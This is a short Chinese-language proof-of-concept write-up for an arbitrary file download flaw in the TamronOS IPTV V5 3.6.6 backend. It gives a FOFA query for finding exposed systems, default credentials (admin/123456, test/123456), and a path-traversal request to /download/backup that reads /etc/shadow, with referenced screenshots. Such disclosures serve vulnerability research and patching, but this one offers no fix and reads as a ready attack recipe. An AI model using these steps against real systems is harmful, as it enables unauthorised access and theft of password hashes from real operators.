## TamronOS IPTV系统后台任意文件下载

## 漏洞描述

TamronOS IPTV系统存在任意文件下载

## 漏洞影响

> TamronOS IPTV V5 3.6.6

## FOFA

> title="TamronOS IPTV系统"

## POC

1）登录界面

![1](resource/TamronOS-IPTV/1.png) 

2）该系统默认弱口令admin/123456,登录后的界面如下也可以试试test/123456

![2](resource/TamronOS-IPTV/2.png)

4）存在下载的地方，下载抓包

![3](resource/TamronOS-IPTV/3.png)

 ![4](resource/TamronOS-IPTV/4.png)

修改参数，读取文件成功POC如下 

```
GET /download/backup?name=./../../../../../etc/shadow
```

![5](resource/TamronOS-IPTV/5.png)

![6](resource/TamronOS-IPTV/6.png)